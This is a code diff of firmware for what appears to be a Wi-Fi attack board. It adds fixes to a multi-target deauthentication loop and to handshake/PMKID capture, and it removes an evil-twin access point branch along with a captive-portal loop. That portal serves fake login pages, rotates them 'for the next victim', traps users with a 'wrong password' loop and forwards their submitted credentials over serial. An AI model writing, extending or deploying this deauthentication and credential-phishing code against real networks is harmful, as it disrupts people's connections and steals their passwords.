+      // DEAUTH <n>: add scan result n to the multi-target deauth list (TX only, no AP).
+      int numStation = readString.substring(7,readString.length()-1).toInt();
       if(numStation < (int)scan_results.size()&&numStation >=0){
         DEBUG_SER_PRINT("Deauthing "+(String)numStation+"\n");
         deauth_wifis.push_back(numStation);
         DEBUG_SER_PRINT("Deauthing "+scan_results[numStation].ssid+"\n");
-        if(readString.substring(0,4)=="EVIL"){
-          int str_len = scan_results[numStation].ssid.length() + 1; 
-
-          // Prepare the character array (the buffer) 
-          char char_array[str_len];
-
-          // Copy it over 
-          scan_results[numStation].ssid.toCharArray(char_array, str_len);
-          char buffer[4];  // Suficiente para "123\0"
-          itoa(scan_results[numStation].channel, buffer, 10);
-          if(str_len>1)
-            createAP(char_array, buffer);
-          else
-            Serial1.print("ERROR: BAD SSID, please try to rescan again");
-        }
-      
-
       }else{
         DEBUG_SER_PRINT("Wrong AP");
       }
-      
 
     }else if(readString.substring(0,4)=="PING"){
       
@@ -2908,10 +2756,14 @@ void loop() {
     }else if(readString.substring(0,4)=="LIST"){
 
       for (uint i = 0; i < scan_results.size(); i++) {
+        // The line is '|'-delimited, so a '|' inside the SSID would shift every later field. Print
+        // it as '?' - the same substitution the FAP's binary decoder makes, so both paths agree.
+        String safe = scan_results[i].ssid;
+        safe.replace("|", "?");
         Serial.print("AP:"+String(i)+"|");
-        Serial.print(scan_results[i].ssid + "|");
+        Serial.print(safe + "|");
         Serial1.print("AP:"+String(i)+"|");
-        Serial1.print(scan_results[i].ssid + "|");
+        Serial1.print(safe + "|");
         {
           // %02X: bytes <0x10 must keep their leading zero, else the host's colon-stripped
           // 12-hex BSSID (used by HSGRAB/PKGRAB/DEAUTHADD) comes up short and is rejected,
@@ -3113,7 +2965,8 @@ void loop() {
       }
     }else if(readString.substring(0,5)=="WEBUI"){
       // M4: board WebUI — read-only status page over the SoftAP.  WEBUI START | STOP | DUMP
-      // Brings up PETRELTESTAP; handleRequest serves the status page (not a portal) while webui_mode.
+      // Brings up PETRELTESTAP; the raw-lwIP listener serves the status page (not a portal) while
+      // webui_mode is set.
       String sub = readString.substring(5); sub.trim();
       if(sub.startsWith("START")){
         if(apActive || cap_active || hopping || hsg_phase != HSG_IDLE || atOwned() ||
@@ -3131,7 +2984,7 @@ void loop() {
         if(atOwned()) atStop();
         Serial.println("WEBUI:stopped"); Serial1.println("WEBUI:stopped");
       }else if(sub.startsWith("DUMP")){
-        char wb[800];   // stack (see handleRequest)
+        static char wb[800];   // BSS, not loop() stack: loop() already carries the whole dispatch
         webui_render(wb, sizeof(wb));
         Serial.println("WEBUI:DUMP<<<"); Serial.print(wb); Serial.println("\n>>>WEBUI:DUMP");
       }else{
@@ -4249,10 +4102,7 @@ void loop() {
   // commands have just been serviced, and while the lifecycle owns the radio every legacy
   // background/portal path is excluded (their latency and side effects must not run).
   apTestTick();
-  if (atOwned()) {
-      apTestHttpTick();
-      return;
-  }
+  if (atOwned()) return;   // the lifecycle owns the radio; every legacy background path is excluded
 
   // P1: channel hop tick
   if (hopping) {
@@ -4324,6 +4174,9 @@ void loop() {
       if (hsg_pmkid) pmkid_stream(hsg_ch);
       else hs_stream(hsg_ch);
       hsg_phase = HSG_IDLE;
+      // Drop the pin: the next passive path (CAPTURE / PMKID scan) is channel-wide, and a stale
+      // BSSID filter would silently discard every other AP's frames.
+      hsg_target_set = false;
     }
   }
 
@@ -4435,6 +4288,10 @@ void loop() {
   }
 
   if (deauth_wifis.size() > 0) {
+    // The list can shrink under us (STOP <n>, SCAN, DEAUTHCLEAR), so clamp before dereferencing:
+    // current_num used to be reset only AFTER the read, which indexed past end() on the first pass
+    // after any removal.
+    if (current_num >= deauth_wifis.size()) current_num = 0;
     memcpy(deauth_bssid, scan_results[deauth_wifis[current_num]].bssid, 6);
     wext_set_channel(WLAN0_NAME, scan_results[deauth_wifis[current_num]].channel);
     current_num++;
@@ -4540,138 +4397,6 @@ void loop() {
       tx_beacon_raw((const uint8_t*)"\x00\xE0\x4C\x01\x02\x03", TX_BCAST, ssid_cstr2, 0x80, channel);
     }
 
-  }
-  
-  // raw-lwIP serves the page when webui_mode/web_portal_mode is set, so skip the Arduino
-  // server.available() loop then (it would double-bind :80 and spam "Accept connection failed").
-  if (apActive && !webui_mode && !web_portal_mode) {
-    // Poll the listen socket at most every 20 ms. loop() runs thousands of times a second, and
-    // calling server.available() (accept) that often makes the SDK spew
-    // "[ERROR] Accept connection failed" non-stop and burns CPU while barely helping latency.
-    // Adaptive interval on top of that: every accept() on an idle socket still prints
-    // "[ERROR] Accept connection failed", so at a fixed 20 ms that is 50 lines/s of noise that
-    // swamps the debug log AND floods the Flipper's UART RX (which has a 127-byte hardware ring).
-    // Back off while accepts keep coming back empty, up to 640 ms, and snap back to 20 ms the
-    // moment a real client appears - so portal latency is unaffected for the user.
-    static uint32_t last_accept_ms = 0;
-    static uint32_t accept_gap_ms = 20;
-    uint32_t now_ms = millis();
-    bool poll_ok = (now_ms - last_accept_ms) >= accept_gap_ms;
-    if(poll_ok) last_accept_ms = now_ms;
-    WiFiClient client = poll_ok ? server.available() : WiFiClient();
-    // A failed accept is NOT distinguishable with operator bool(): WiFiClient::operator bool() is
-    // just "_sock >= 0", and getAvailable() hands back a non-negative value even when the SDK has
-    // already printed "Accept connection failed". That is why the first version of this backoff
-    // never engaged and why the main block below parsed an empty client on every poll. Ask for a
-    // real TCP connection instead - the request loop already uses connected() for the same reason.
-    bool real_client = client && client.connected();
-    if(poll_ok) {
-      if(real_client) {
-        accept_gap_ms = 20;                       // a real client: back to the responsive rate
-      } else if(accept_gap_ms < 640) {
-        accept_gap_ms *= 2;                       // idle: keep quiet
-      }
-    }
-    if (real_client) {
-      //client.setRecvTimeout(500);
-      String request;
-      request.reserve(256);  // Reservamos memoria para evitar fragmentación
-      /*
-      struct tcp_pcb *tcp;
-      for (tcp = tcp_tw_pcbs; tcp != NULL; tcp = tcp->next) {
-        if (tcp->local_port == 80) tcp->local_port = localPortNew++;
-        tcp_close(tcp);
-      }
-      */
-
-      // BOUNDED reception (architect D.4, part 1): a silent connected client used to keep loop() in
-      // here forever, starving every command. Absolute 1 s deadline plus a 1 KB request-line cap.
-      // (The inline percent-decode branch and the trailing delay(10) inside this loop are the
-      // architect's remaining items; they are now at least bounded by this deadline.)
-      const uint32_t started_ms = millis();
-      const uint32_t HTTP_READ_MS = 1000;
-      const size_t HTTP_LINE_MAX = 1024;
-      size_t received = 0;
-      while (client.connected() && (uint32_t)(millis() - started_ms) < HTTP_READ_MS &&
-            received < HTTP_LINE_MAX) {
-        if (client.available()) {
-          char character = client.read();
-        ++received;
-          if (character == '\n') {
-            while(client.available()){
-            character=client.read();
-            client.clearWriteError();
-            
-            delay(1);
-            }
-            String path = parseRequest(request);
-            Serial.println(request);
-            uint32_t cip = (uint32_t)client.remoteIP();
-            bool authed = ip_is_authed(cip);
-            Serial.print("CIP="); Serial.print(cip, HEX); Serial.print(" authed="); Serial.println(authed);
-            // RFC 8908 Captive-Portal API endpoint that DHCP option 114 points at.
-            // Android's NetworkMonitor fetches this expecting application/captive+json.
-            // Report captive:false once this client is authorized so the OS clears the warning.
-            if(path.startsWith("/cp.json")){
-              String j = String("{\"captive\":") + (authed ? "false" : "true") + ",\"user-portal-url\":\"" + String(portalUrl) + "\"}";
-              String resp = makeResponse(200, "application/captive+json", false, j.length());
-              resp += j;
-              client.write(resp.c_str());
-            }else
-            // Portal page + form submissions get the HTML; every captive probe
-            // (generate_204, ncsi.txt, success.html, …) and any unknown URL gets a
-            // 302 to the portal root, which is what triggers the Android/iOS sign-in flow.
-            if(path.equals("/")||path.startsWith("/?")||path.startsWith("/login")||path.startsWith("/get")||path.startsWith("/userinput")){
-              if (deauth_wifis.size() != 0)
-                handleRequest(client, (enum portals)portal, scan_results[deauth_wifis[0]].ssid);
-              else
-                handleRequest(client, (enum portals)portal, "router");
-              if (path.indexOf('?') >= 0 && (path.indexOf('=') > path.indexOf('?'))) {
-                String datos = path.substring(path.indexOf('?') + 1);
-                if (datos.length() > 0) {
-                  Serial1.print("EV:");
-                  Serial1.println(datos);
-                  // C2: advance to the next built-in portal for the next victim.
-                  if (portal_rot) portal = (portal + 1) % 6;
-                  // Portal pages now loop the victim ("wrong password"), so we keep the
-                  // network captive and never validate (no 204) -> the sign-in keeps
-                  // coming back. Re-enable the line below to instead clear the OS
-                  // "no internet" warning after a capture (that also makes the
-                  // handle204()/authed_ips path live again):
-                  // ip_mark_authed(cip);   // <- 204 path: mark this client authed after creds
-                }
-              }
-          }else{
-            // Probe / unknown URL: authorized client -> 204 (clears warning); else 302 to portal.
-            if(authed) handle204(client); else handleRedirect(client);
-          }
-          break;
-
-          }
-          // Architect D.4/1: the inline percent-decoding branch was removed. It read two bytes into
-          // a char[2] with no NUL terminator and handed that to strtol(), and the read itself was
-          // unchecked - an unbounded parse on attacker-controlled input. Nothing here needs it: the
-          // request line is matched literally.
-          request += character;
-        }
-      }
-      
-
-      // Opcional: forzar limpieza de conexiones TIME-WAIT (solo si es necesario)
-      /*
-      struct tcp_pcb *tcp;
-      for (tcp = tcp_tw_pcbs; tcp != NULL; tcp = tcp->next) {
-        if (tcp->local_port == 80) tcp->local_port = localPortNew++;
-        tcp_close(tcp);
-      }
-      */
-
-      
-
-      delay(50);  // menor delay, no saturar
-      client.stop();
-
-    }
   }
   
 }
